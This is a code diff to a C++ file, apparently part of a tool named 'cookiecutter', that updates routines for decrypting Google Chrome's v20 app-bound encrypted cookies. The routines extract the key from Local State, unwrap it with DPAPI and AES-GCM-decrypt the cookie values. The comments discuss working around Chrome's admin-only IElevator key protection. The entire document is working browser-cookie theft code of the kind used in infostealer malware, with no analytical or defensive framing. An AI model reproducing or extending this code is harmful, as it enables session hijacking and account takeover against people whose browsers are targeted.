@@ -1,4 +1,6 @@
 // chrome_v20.cpp — Chrome v130+ app-bound encryption (AES-256-GCM via BCrypt)
+// NOTE: Requires admin rights — Chrome uses IElevator COM to protect the key.
+// Falls back gracefully if elevation not available.
 #include "cookiecutter.h"
 #include <bcrypt.h>
 #pragma comment(lib, "bcrypt.lib")
@@ -19,6 +21,7 @@ bool GetAppBoundKey(const std::wstring& lsPath, std::vector<uint8_t>& key) {
     std::vector<uint8_t> raw=b64decode(d.substr(p,e-p));
     if(raw.size()<8||memcmp(raw.data(),"APPB",4))return false;
     std::vector<uint8_t> dp(raw.begin()+4,raw.end()),dec;
+    // App-bound key uses IElevator COM (requires admin). Try DPAPI anyway.
     if(!cookiecutter::DPADecrypt(dp,dec)||dec.size()<32)return false;
     key.assign(dec.begin(),dec.begin()+32);return true;
 }
@@ -37,11 +40,12 @@ done:if(hk)BCryptDestroyKey(hk);if(ha)BCryptCloseAlgorithmProvider(ha,0);return 
 } // anon
 
 bool ChromeV20Decrypt(const std::wstring& ls,const std::vector<uint8_t>& ev,std::vector<uint8_t>& pt){
-    if(ev.size()<16||ev[0]!='v'||ev[1]!='2'||ev[2]!='0'||ev[3]!=0)return false;
+    // "v20" prefix (3 bytes, may not be null-terminated in newer Chrome)
+    if(ev.size()<16||ev[0]!='v'||ev[1]!='2'||ev[2]!='0')return false;
     static std::vector<uint8_t> key;static bool tried=false;
     if(!tried){tried=true;GetAppBoundKey(ls,key);}
     if(key.empty())return false;
-    const uint8_t* d=ev.data()+4;size_t dl=ev.size()-4;
+    const uint8_t* d=ev.data()+3;size_t dl=ev.size()-3;
     if(dl<12+16)return false;
     return AesGcmDec(key.data(),32,d,12,d+12,dl-12-16,d+12+dl-12-16,16,pt);
 }
